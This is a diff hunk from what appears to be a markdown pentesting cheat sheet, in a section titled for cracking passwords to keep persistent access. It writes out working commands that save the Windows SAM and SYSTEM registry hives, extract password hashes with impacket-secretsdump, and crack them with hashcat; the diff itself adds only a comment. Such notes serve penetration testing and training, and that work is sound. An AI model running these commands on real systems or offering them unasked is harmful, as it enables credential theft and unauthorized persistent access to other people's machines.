@@ -24,8 +24,10 @@ net user new_user /delete /f
 ### Crack password (persistent access)
 
 ```bash
+# /System32/config
 reg save HKLM\sam ./sam.save
 reg save HKLM\system ./system.save
+
 impacket-secretsdump -sam sam.save -system system.save LOCAL #paste dump hashes in hashes.txt
 
 hashcat -m 1000 hashes.txt wordlist.txt
